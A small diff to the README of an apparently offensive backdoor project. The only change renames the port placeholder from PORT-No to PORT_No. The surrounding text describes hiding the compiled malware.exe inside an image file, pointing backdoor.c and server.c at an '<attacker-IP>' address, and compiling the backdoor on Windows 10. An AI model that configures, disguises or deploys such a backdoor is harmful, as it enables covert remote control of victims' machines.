@@ -67,11 +67,11 @@ The compiled **malware.exe** can be hidden within an image file or any other fil
   **for backdoor.c**
     ```c
    ServIP = "<attacker-IP>";
-   ServPort = <PORT-No>;
+   ServPort = <PORT_No>;
   **for server.c**
   ```c
 server_address.sin_addr.s_addr=inet_addr("<attacker-IP machine>");
-		server_address.sin_port=htons(<PORT-No>);
+		server_address.sin_port=htons(<PORT_No>);
 ```
 2. Compile the backdoor on Windows 10 using the following command using:
    **for backdoor.c**
